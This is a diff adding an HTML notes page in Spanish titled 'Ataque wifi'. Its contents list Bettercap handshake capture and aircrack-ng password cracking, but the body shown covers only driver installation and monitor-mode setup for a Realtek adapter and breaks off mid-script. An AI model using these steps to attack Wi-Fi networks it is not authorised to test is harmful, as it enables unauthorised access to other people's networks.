@@ -1,0 +1,879 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Ataque wifi</title><style>
+	/* cspell:disable-file */
+	/* webkit printing magic: print all background colors */
+	html {
+		-webkit-print-color-adjust: exact;
+	}
+	* {
+		box-sizing: border-box;
+		-webkit-print-color-adjust: exact;
+	}
+	
+	html,
+	body {
+		margin: 0;
+		padding: 0;
+	}
+	@media only screen {
+		body {
+			margin: 2em auto;
+			max-width: 900px;
+			color: rgb(55, 53, 47);
+		}
+	}
+	
+	body {
+		line-height: 1.5;
+		white-space: pre-wrap;
+	}
+	
+	a,
+	a.visited {
+		color: inherit;
+		text-decoration: underline;
+	}
+	
+	.pdf-relative-link-path {
+		font-size: 80%;
+		color: #444;
+	}
+	
+	h1,
+	h2,
+	h3 {
+		letter-spacing: -0.01em;
+		line-height: 1.2;
+		font-weight: 600;
+		margin-bottom: 0;
+	}
+	
+	.page-title {
+		font-size: 2.5rem;
+		font-weight: 700;
+		margin-top: 0;
+		margin-bottom: 0.75em;
+	}
+	
+	h1 {
+		font-size: 1.875rem;
+		margin-top: 1.875rem;
+	}
+	
+	h2 {
+		font-size: 1.5rem;
+		margin-top: 1.5rem;
+	}
+	
+	h3 {
+		font-size: 1.25rem;
+		margin-top: 1.25rem;
+	}
+	
+	.source {
+		border: 1px solid #ddd;
+		border-radius: 3px;
+		padding: 1.5em;
+		word-break: break-all;
+	}
+	
+	.callout {
+		border-radius: 3px;
+		padding: 1rem;
+	}
+	
+	figure {
+		margin: 1.25em 0;
+		page-break-inside: avoid;
+	}
+	
+	figcaption {
+		opacity: 0.5;
+		font-size: 85%;
+		margin-top: 0.5em;
+	}
+	
+	mark {
+		background-color: transparent;
+	}
+	
+	.indented {
+		padding-left: 1.5em;
+	}
+	
+	hr {
+		background: transparent;
+		display: block;
+		width: 100%;
+		height: 1px;
+		visibility: visible;
+		border: none;
+		border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+	}
+	
+	img {
+		max-width: 100%;
+	}
+	
+	@media only print {
+		img {
+			max-height: 100vh;
+			object-fit: contain;
+		}
+	}
+	
+	@page {
+		margin: 1in;
+	}
+	
+	.collection-content {
+		font-size: 0.875rem;
+	}
+	
+	.column-list {
+		display: flex;
+		justify-content: space-between;
+	}
+	
+	.column {
+		padding: 0 1em;
+	}
+	
+	.column:first-child {
+		padding-left: 0;
+	}
+	
+	.column:last-child {
+		padding-right: 0;
+	}
+	
+	/* Estilos mejorados para el índice (table_of_contents) */
+	.table_of_contents {
+		background: #f9f9f9; /* Fondo claro para destacar el índice */
+		padding: 1.5em; /* Más espacio interno */
+		border-radius: 8px; /* Bordes redondeados */
+		box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1); /* Sombra sutil */
+		max-width: 600px; /* Ancho máximo para mantenerlo compacto */
+		margin: 1em 0; /* Margen superior e inferior */
+	}
+	
+	.table_of_contents-item {
+		display: block;
+		font-size: 0.9rem; /* Tamaño de fuente ligeramente más pequeño */
+		line-height: 1.6; /* Mayor espaciado entre líneas */
+		padding: 0.3rem 0; /* Espaciado vertical */
+		transition: all 0.2s ease; /* Transición suave para efectos */
+	}
+	
+	.table_of_contents-link {
+		text-decoration: none; /* Sin subrayado por defecto */
+		color: #2c3e50; /* Color oscuro para contraste */
+		border-bottom: none; /* Quitamos el borde inferior original */
+		padding-left: 0.5em; /* Espacio a la izquierda */
+		display: block; /* Para que ocupe todo el ancho */
+	}
+	
+	.table_of_contents-link:hover {
+		color: #2980b9; /* Color al pasar el ratón */
+		background: rgba(41, 128, 185, 0.1); /* Fondo sutil al hover */
+		border-radius: 4px; /* Bordes redondeados al hover */
+		padding-left: 0.7em; /* Pequeño desplazamiento al hover */
+	}
+	
+	.table_of_contents-indent-0 {
+		font-weight: 600; /* Negrita para nivel superior */
+		margin-left: 0; /* Sin indentación para nivel 0 */
+	}
+	
+	.table_of_contents-indent-1 {
+		margin-left: 2rem; /* Indentación para nivel 1 */
+		font-weight: 400; /* Peso normal */
+	}
+	
+	.table_of_contents-indent-2 {
+		margin-left: 4rem; /* Indentación para nivel 2 */
+		font-style: italic; /* Cursiva para nivel 2, si aplica */
+	}
+	
+	.table_of_contents-indent-3 {
+		margin-left: 6rem; /* Indentación para nivel 3 */
+	}
+	
+	table,
+	th,
+	td {
+		border: 1px solid rgba(55, 53, 47, 0.09);
+		border-collapse: collapse;
+	}
+	
+	table {
+		border-left: none;
+		border-right: none;
+	}
+	
+	th,
+	td {
+		font-weight: normal;
+		padding: 0.25em 0.5em;
+		line-height: 1.5;
+		min-height: 1.5em;
+		text-align: left;
+	}
+	
+	th {
+		color: rgba(55, 53, 47, 0.6);
+	}
+	
+	ol,
+	ul {
+		margin: 0;
+		margin-block-start: 0.6em;
+		margin-block-end: 0.6em;
+	}
+	
+	li > ol:first-child,
+	li > ul:first-child {
+		margin-block-start: 0.6em;
+	}
+	
+	ul > li {
+		list-style: disc;
+	}
+	
+	ul.to-do-list {
+		padding-inline-start: 0;
+	}
+	
+	ul.to-do-list > li {
+		list-style: none;
+	}
+	
+	.to-do-children-checked {
+		text-decoration: line-through;
+		opacity: 0.375;
+	}
+	
+	ul.toggle > li {
+		list-style: none;
+	}
+	
+	ul {
+		padding-inline-start: 1.7em;
+	}
+	
+	ul > li {
+		padding-left: 0.1em;
+	}
+	
+	ol {
+		padding-inline-start: 1.6em;
+	}
+	
+	ol > li {
+		padding-left: 0.2em;
+	}
+	
+	.mono ol {
+		padding-inline-start: 2em;
+	}
+	
+	.mono ol > li {
+		text-indent: -0.4em;
+	}
+	
+	.toggle {
+		padding-inline-start: 0em;
+		list-style-type: none;
+	}
+	
+	/* Indent toggle children */
+	.toggle > li > details {
+		padding-left: 1.7em;
+	}
+	
+	.toggle > li > details > summary {
+		margin-left: -1.1em;
+	}
+	
+	.selected-value {
+		display: inline-block;
+		padding: 0 0.5em;
+		background: rgba(206, 205, 202, 0.5);
+		border-radius: 3px;
+		margin-right: 0.5em;
+		margin-top: 0.3em;
+		margin-bottom: 0.3em;
+		white-space: nowrap;
+	}
+	
+	.collection-title {
+		display: inline-block;
+		margin-right: 1em;
+	}
+	
+	.page-description {
+		margin-bottom: 2em;
+	}
+	
+	.simple-table {
+		margin-top: 1em;
+		font-size: 0.875rem;
+		empty-cells: show;
+	}
+	.simple-table td {
+		height: 29px;
+		min-width: 120px;
+	}
+	
+	.simple-table th {
+		height: 29px;
+		min-width: 120px;
+	}
+	
+	.simple-table-header-color {
+		background: rgb(247, 246, 243);
+		color: black;
+	}
+	.simple-table-header {
+		font-weight: 500;
+	}
+	
+	time {
+		opacity: 0.5;
+	}
+	
+	.icon {
+		display: inline-block;
+		max-width: 1.2em;
+		max-height: 1.2em;
+		text-decoration: none;
+		vertical-align: text-bottom;
+		margin-right: 0.5em;
+	}
+	
+	img.icon {
+		border-radius: 3px;
+	}
+	
+	.user-icon {
+		width: 1.5em;
+		height: 1.5em;
+		border-radius: 100%;
+		margin-right: 0.5rem;
+	}
+	
+	.user-icon-inner {
+		font-size: 0.8em;
+	}
+	
+	.text-icon {
+		border: 1px solid #000;
+		text-align: center;
+	}
+	
+	.page-cover-image {
+		display: block;
+		object-fit: cover;
+		width: 100%;
+		max-height: 30vh;
+	}
+	
+	.page-header-icon {
+		font-size: 3rem;
+		margin-bottom: 1rem;
+	}
+	
+	.page-header-icon-with-cover {
+		margin-top: -0.72em;
+		margin-left: 0.07em;
+	}
+	
+	.page-header-icon img {
+		border-radius: 3px;
+	}
+	
+	.link-to-page {
+		margin: 1em 0;
+		padding: 0;
+		border: none;
+		font-weight: 500;
+	}
+	
+	p > .user {
+		opacity: 0.5;
+	}
+	
+	td > .user,
+	td > time {
+		white-space: nowrap;
+	}
+	
+	input[type="checkbox"] {
+		transform: scale(1.5);
+		margin-right: 0.6em;
+		vertical-align: middle;
+	}
+	
+	p {
+		margin-top: 0.5em;
+		margin-bottom: 0.5em;
+	}
+	
+	.image {
+		border: none;
+		margin: 1.5em 0;
+		padding: 0;
+		border-radius: 0;
+		text-align: center;
+	}
+	
+	.code,
+	code {
+		background: rgba(135, 131, 120, 0.15);
+		border-radius: 3px;
+		padding: 0.2em 0.4em;
+		border-radius: 3px;
+		font-size: 85%;
+		tab-size: 2;
+	}
+	
+	code {
+		color: #eb5757;
+	}
+	
+	.code {
+		padding: 1.5em 1em;
+	}
+	
+	.code-wrap {
+		white-space: pre-wrap;
+		word-break: break-all;
+	}
+	
+	.code > code {
+		background: none;
+		padding: 0;
+		font-size: 100%;
+		color: inherit;
+	}
+	
+	blockquote {
+		font-size: 1.25em;
+		margin: 1em 0;
+		padding-left: 1em;
+		border-left: 3px solid rgb(55, 53, 47);
+	}
+	
+	.bookmark {
+		text-decoration: none;
+		max-height: 8em;
+		padding: 0;
+		display: flex;
+		width: 100%;
+		align-items: stretch;
+	}
+	
+	.bookmark-title {
+		font-size: 0.85em;
+		overflow: hidden;
+		text-overflow: ellipsis;
+		height: 1.75em;
+		white-space: nowrap;
+	}
+	
+	.bookmark-text {
+		display: flex;
+		flex-direction: column;
+	}
+	
+	.bookmark-info {
+		flex: 4 1 180px;
+		padding: 12px 14px 14px;
+		display: flex;
+		flex-direction: column;
+		justify-content: space-between;
+	}
+	
+	.bookmark-image {
+		width: 33%;
+		flex: 1 1 180px;
+		display: block;
+		position: relative;
+		object-fit: cover;
+		border-radius: 1px;
+	}
+	
+	.bookmark-description {
+		color: rgba(55, 53, 47, 0.6);
+		font-size: 0.75em;
+		overflow: hidden;
+		max-height: 4.5em;
+		word-break: break-word;
+	}
+	
+	.bookmark-href {
+		font-size: 0.75em;
+		margin-top: 0.25em;
+	}
+	
+	.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+	.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+	.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+	.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+	.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+	.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+	.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+	.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+	.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+	.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+	.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+	.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+	.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+	.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+	.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+	.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+	.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+	.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+	.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+	.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+	.highlight-default {
+		color: rgba(55, 53, 47, 1);
+	}
+	.highlight-gray {
+		color: rgba(120, 119, 116, 1);
+		fill: rgba(120, 119, 116, 1);
+	}
+	.highlight-brown {
+		color: rgba(159, 107, 83, 1);
+		fill: rgba(159, 107, 83, 1);
+	}
+	.highlight-orange {
+		color: rgba(217, 115, 13, 1);
+		fill: rgba(217, 115, 13, 1);
+	}
+	.highlight-yellow {
+		color: rgba(203, 145, 47, 1);
+		fill: rgba(203, 145, 47, 1);
+	}
+	.highlight-teal {
+		color: rgba(68, 131, 97, 1);
+		fill: rgba(68, 131, 97, 1);
+	}
+	.highlight-blue {
+		color: rgba(51, 126, 169, 1);
+		fill: rgba(51, 126, 169, 1);
+	}
+	.highlight-purple {
+		color: rgba(144, 101, 176, 1);
+		fill: rgba(144, 101, 176, 1);
+	}
+	.highlight-pink {
+		color: rgba(193, 76, 138, 1);
+		fill: rgba(193, 76, 138, 1);
+	}
+	.highlight-red {
+		color: rgba(212, 76, 71, 1);
+		fill: rgba(212, 76, 71, 1);
+	}
+	.highlight-default_background {
+		color: rgba(55, 53, 47, 1);
+	}
+	.highlight-gray_background {
+		background: rgba(248, 248, 247, 1);
+	}
+	.highlight-brown_background {
+		background: rgba(244, 238, 238, 1);
+	}
+	.highlight-orange_background {
+		background: rgba(251, 236, 221, 1);
+	}
+	.highlight-yellow_background {
+		background: rgba(251, 243, 219, 1);
+	}
+	.highlight-teal_background {
+		background: rgba(237, 243, 236, 1);
+	}
+	.highlight-blue_background {
+		background: rgba(231, 243, 248, 1);
+	}
+	.highlight-purple_background {
+		background: rgba(248, 243, 252, 1);
+	}
+	.highlight-pink_background {
+		background: rgba(252, 241, 246, 1);
+	}
+	.highlight-red_background {
+		background: rgba(253, 235, 236, 1);
+	}
+	.block-color-default {
+		color: inherit;
+		fill: inherit;
+	}
+	.block-color-gray {
+		color: rgba(120, 119, 116, 1);
+		fill: rgba(120, 119, 116, 1);
+	}
+	.block-color-brown {
+		color: rgba(159, 107, 83, 1);
+		fill: rgba(159, 107, 83, 1);
+	}
+	.block-color-orange {
+		color: rgba(217, 115, 13, 1);
+		fill: rgba(217, 115, 13, 1);
+	}
+	.block-color-yellow {
+		color: rgba(203, 145, 47, 1);
+		fill: rgba(203, 145, 47, 1);
+	}
+	.block-color-teal {
+		color: rgba(68, 131, 97, 1);
+		fill: rgba(68, 131, 97, 1);
+	}
+	.block-color-blue {
+		color: rgba(51, 126, 169, 1);
+		fill: rgba(51, 126, 169, 1);
+	}
+	.block-color-purple {
+		color: rgba(144, 101, 176, 1);
+		fill: rgba(144, 101, 176, 1);
+	}
+	.block-color-pink {
+		color: rgba(193, 76, 138, 1);
+		fill: rgba(193, 76, 138, 1);
+	}
+	.block-color-red {
+		color: rgba(212, 76, 71, 1);
+		fill: rgba(212, 76, 71, 1);
+	}
+	.block-color-default_background {
+		color: inherit;
+		fill: inherit;
+	}
+	.block-color-gray_background {
+		background: rgba(248, 248, 247, 1);
+	}
+	.block-color-brown_background {
+		background: rgba(244, 238, 238, 1);
+	}
+	.block-color-orange_background {
+		background: rgba(251, 236, 221, 1);
+	}
+	.block-color-yellow_background {
+		background: rgba(251, 243, 219, 1);
+	}
+	.block-color-teal_background {
+		background: rgba(237, 243, 236, 1);
+	}
+	.block-color-blue_background {
+		background: rgba(231, 243, 248, 1);
+	}
+	.block-color-purple_background {
+		background: rgba(248, 243, 252, 1);
+	}
+	.block-color-pink_background {
+		background: rgba(252, 241, 246, 1);
+	}
+	.block-color-red_background {
+		background: rgba(253, 235, 236, 1);
+	}
+	.select-value-color-uiBlue { background-color: undefined; }
+	.select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); }
+	.select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); }
+	.select-value-color-green { background-color: rgba(123, 183, 129, 0.27); }
+	.select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); }
+	.select-value-color-transparentGray { background-color: undefined; }
+	.select-value-color-translucentGray { background-color: undefined; }
+	.select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); }
+	.select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); }
+	.select-value-color-red { background-color: rgba(244, 171, 159, 0.4); }
+	.select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); }
+	.select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); }
+	.select-value-color-pageGlass { background-color: undefined; }
+	.select-value-color-washGlass { background-color: undefined; }
+	
+	.checkbox {
+		display: inline-flex;
+		vertical-align: text-bottom;
+		width: 16;
+		height: 16;
+		background-size: 16px;
+		margin-left: 2px;
+		margin-right: 5px;
+	}
+	
+	.checkbox-on {
+		background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+	}
+	
+	.checkbox-off {
+		background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+	}
+		
+	</style></head><body><article id="1bed9b17-7cd1-80a3-b687-d4951fe2eb13" class="page sans"><header><h1 class="page-title">Ataque wifi</h1><p class="page-description"></p></header><div class="page-body"><hr id="1bed9b17-7cd1-8199-9f31-f7382d685b5d"/><nav id="1bed9b17-7cd1-801f-b6c5-e02cf4f9d31a" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80e6-8f19-e8e5e0b721dc">Pasos previos</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80af-9d9f-c090aabe0905">Instalación de drivers</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-805f-a407-e5b4c2ebe1dd">Inicialización de antena</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-803a-b191-d3dad1364f71">Comprobaciones</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80d3-9b2c-cb2d08531518">Bettercap - Captura del handshake</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80c2-813f-fb9bd1207058">¿Qué hace Bettercap en este ataque?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-807a-9020-e8a0f3df76db">Pasos</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1bed9b17-7cd1-806c-81b6-e20ee77c24f1">Explicacion captura tráfico de red pcap</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80fe-8780-c22f29c6f7ac">Paquetes EAPOL - El 4-way Handshake</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-803e-a9f0-fdd75fe3e55d">Proceso de Autenticación Wi-Fi (EAPOL)</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80b8-8a52-c412aa15b53c">¿Qué es la contraseña y cómo se usa en WPA/WPA2?</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80a6-b4c6-d9dc619e6936">Handshake capturado</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#1bed9b17-7cd1-8073-8f49-defba5e50030">aircrack-ng - Descifrado de la contraseña</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80ec-8874-cd8511f71749">Explicación</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#1bed9b17-7cd1-80dd-ac1b-dc60efe6ad76">Proceso para sacar contraseña</a></div></nav><h1 id="1bed9b17-7cd1-80e6-8f19-e8e5e0b721dc" class="">Pasos previos</h1><h2 id="1bed9b17-7cd1-80af-9d9f-c090aabe0905" class="">Instalación de drivers</h2><p id="1bed9b17-7cd1-808a-a2c1-c6f9d4a957c6" class="">Si no tenemos los drivers instalados, ejecutar el script setup.sh</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80fa-ab03-fa14eab35b08" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash
+	
+	# Actualiza la lista de paquetes disponibles en los repositorios del sistema.
+	sudo apt update
+# Actualiza la lista de paquetes disponibles en los repositorios del sistema.
+sudo apt update
+
+# Instala &#x27;bc&#x27; (una calculadora) y los encabezados del kernel necesarios para compilar drivers.
+sudo apt-get install -y bc linux-headers-$(uname -r)
+
+# Descarga el módulo &#x27;r8188eu.ko&#x27; del kernel si está cargado, para evitar conflictos.
+sudo rmmod r8188eu.ko
+
+# Clona el repositorio de GitHub que contiene los drivers para el chipset RTL8188EUS.
+git clone https://github.com/aircrack-ng/rtl8188eus
+
+# Cambia al directorio del repositorio clonado para trabajar con los archivos descargados.
+cd rtl8188eus
+
+# Inicia una sesión de superusuario para ejecutar comandos con privilegios elevados.
+sudo -i
+
+# Crea un archivo de configuración para evitar que el módulo &#x27;r8188eu.ko&#x27; se cargue automáticamente.
+echo &quot;blacklist r8188eu.ko&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
+
+# Sale de la sesión de superusuario para volver al usuario normal.
+exit
+
+# Compila el código fuente del driver para generar el módulo correspondiente.
+make
+
+# Instala el driver compilado en el sistema para que esté disponible para su uso.
+sudo make install
+
+# Carga el nuevo módulo &#x27;8188eu&#x27; en el kernel para activar el driver.
+sudo modprobe 8188eu
+
+# Desactiva la interfaz de red &#x27;wlan0&#x27; para poder configurarla.
+sudo ifconfig wlan0 down
+
+# Cambia la interfaz &#x27;wlan0&#x27; a modo monitor, útil para capturar paquetes Wi-Fi.
+sudo iwconfig wlan0 mode monitor
+
+# Reactiva la interfaz &#x27;wlan0&#x27; con la nueva configuración en modo monitor.
+sudo ifconfig wlan0 up
+</code></pre><p id="1bed9b17-7cd1-8054-acdd-ed82ddb39b49" class="">
+</p><p id="1bed9b17-7cd1-80e5-af5c-d0abf14790b2" class="">Para eliminar conexión de red existentes</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-807a-9562-e267e471eba3" class="code"><code class="language-Bash">sudo ip link delete docker0</code></pre><div id="1bed9b17-7cd1-800d-b2ac-c63f13f10e5b" class="column-list"><div id="1bed9b17-7cd1-80f1-94a6-d014239ccd6e" style="width:87.5%" class="column"><p id="1bed9b17-7cd1-80ce-aa04-fe42da3638c3" class="">Si estamos en máquina virutal, debemos activar la antena en la parte de usb </p></div><div id="1bed9b17-7cd1-803b-9233-f06c5e7fc606" style="width:12.5%" class="column"><figure id="1bed9b17-7cd1-8084-b6d2-f6b6d2727f59" class="image"><a href="wifi_attack_resources/image.png"><img style="width:36px" src="wifi_attack_resources/image.png"/></a></figure></div></div><h2 id="1bed9b17-7cd1-805f-a407-e5b4c2ebe1dd" class="">Inicialización de antena</h2><p id="1bed9b17-7cd1-8023-9446-dbc1c91e592b" class="">Una vez activado el usb, ejecutamos el script<mark class="highlight-blue"><strong> </strong></mark><mark class="highlight-blue"><strong><a href="http://startWifi.sh">startWifi.sh</a></strong></mark><mark class="highlight-blue"><strong> </strong></mark> para configurar un adaptador Wi-Fi USB para modo monitor, lo que permite capturar tráfico de red inalámbrica, útil en auditorías de seguridad con herramientas como Aircrack-ng.</p><p id="1bed9b17-7cd1-802b-9c01-f3cac0e9d82c" class=""><strong>Requisitos</strong>: Asumimos que el adaptador usa el chipset Realtek RTL8188EUS y que la interfaz se llama wlan0. También requiere permisos de superusuario (sudo) y herramientas como airmon-ng.</p><p id="1bed9b17-7cd1-8062-8c7d-e06c9e09d3b5" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1bed9b17-7cd1-80b2-bb4c-c8ed0947529a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash
+
+# Elimina el módulo genérico &#x27;rtl8xxxu&#x27; para evitar conflictos con el driver específico.
+sudo rmmod rtl8xxxu
+
+# Carga el módulo específico &#x27;8188eu&#x27; para el chipset Realtek RTL8188EUS.
+sudo modprobe 8188eu
+
+# Reinicia NetworkManager para refrescar las conexiones de red y reconocer los cambios en los drivers.
+sudo systemctl restart NetworkManager
+
+# Pide al usuario que desconecte y vuelva a conectar el adaptador Wi-Fi USB.
+echo &quot;Please disconnect the WiFi USB adapter and reconnect it.&quot;
+
+# Pide al usuario que presione Enter cuando haya reconectado el adaptador.
+echo &quot;Press Enter when you are ready...&quot;
+read -r
+
+# Informa que el script está esperando a que la interfaz &#x27;wlan0&#x27; aparezca.
+echo &quot;Waiting for &#x27;wlan0&#x27; to appear...&quot;
+
+# Inicia un bucle que se ejecuta hasta que &#x27;wlan0&#x27; sea detectada.
+while true; do
+    # Verifica si &#x27;wlan0&#x27; está presente sin mostrar errores.
+    if iwconfig 2&gt;/dev/null | grep -q &quot;wlan0&quot;; then
+        # Si &#x27;wlan0&#x27; es detectada, imprime un mensaje y sale del bucle.
